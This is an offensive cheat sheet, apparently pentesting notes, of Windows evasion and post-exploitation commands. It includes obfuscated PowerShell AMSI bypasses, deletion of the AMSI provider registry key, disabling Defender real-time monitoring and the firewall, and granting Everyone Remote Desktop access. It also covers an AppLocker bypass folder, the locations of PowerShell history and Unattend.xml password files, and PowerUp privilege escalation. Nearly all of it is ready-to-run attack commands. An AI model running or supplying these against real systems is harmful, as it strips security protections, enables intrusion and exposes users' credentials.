#  Bypass Windows AMSI / AV Evasion
- Using commands in shell:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse

Set-MpPreference -DisableRealtimeMonitoring $true
```
- Using 
- Using [AMSITrigger.exe](https://github.com/RythmStick/AMSITrigger). This will show powershell triggers and help to modify the payload manually. 
```powershell
AmsiTrigger.exe -i shell.ps1
```
- Using [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). As it encodes the payload in numerous ways.
```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
SET SCRIPTBLOCK <Payload>
OR
SET SCRIPTPATH <URL of payload>
```

# Disable real-time protection on Windows.
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Turn Firewall off on Windows:
```bash
netsh advfirewall set allprofiles state off
```
# Remote Desktop Connection:
```bash
net localgroup "Remote Desktop Users" Everyone /Add
```

## Bypass Windows Applocker

- Safer location for executing binaries.

 `C:\Windows\System32\spool\drivers\color`

# Powershell command history

  `\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

# Users' passwords in base64 encoding.

  `C:\Windows\Panther\Unattend\Unattended.xml`

# Privilege Escalation

- Use [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)

   ```powershell
   . .\PowerUp.ps1
  Invoke-AllChecks
  ```
